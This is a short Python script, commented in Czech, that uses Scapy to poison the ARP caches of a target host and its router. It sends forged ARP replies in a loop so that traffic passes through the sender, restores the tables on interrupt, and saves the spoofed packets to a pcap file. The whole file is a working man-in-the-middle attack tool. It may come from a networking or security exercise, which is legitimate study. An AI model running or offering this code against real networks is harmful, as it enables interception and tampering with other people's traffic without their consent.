from scapy.all import ARP, wrpcap, sendp as s, Ether
import time
# --- Hlavní funkce --- #
def spoof(target_ip, target_mac, router_ip, router_mac):
    # Odeslání ARP paketů



    # Vytvoření falešného ARP paketu pro oběť
    arp_obet = Ether(dst=target_mac) / ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac)
    arp_router = Ether(dst=router_mac) / ARP(op=2, psrc=target_ip, pdst=router_ip, hwdst=router_mac)

    # Restore tabulek
    arp_obet_restore = Ether(dst=target_mac) / ARP(op=2, psrc=router_ip, hwsrc=router_mac, pdst=target_ip, hwdst=target_mac)
    arp_router_restore = Ether(dst=router_mac) / ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=router_ip, hwdst=router_mac)

    packet_list = []

    try: 
        print(f"Sending spoofed ARP packets to {target_ip} and {router_ip}... (Press Ctrl+C to stop)")
        while True:
            s(arp_obet, verbose=False)
            packet_list.append(arp_obet)
            
            s(arp_router, verbose=False)
            packet_list.append(arp_router)
            
            time.sleep(2)

    except KeyboardInterrupt:   
        print("Stopping ARP spoofing and restoring network...")
        # Odeslání správných ARP paketů pro obnovení sítě
        s(arp_obet_restore, verbose=False, count=5)
        s(arp_router_restore, verbose=False, count=5)

        print("Network restored. Program terminated.")
        wrpcap("capture.pcap", packet_list)
        # Uložení komunikace do .pcap souboru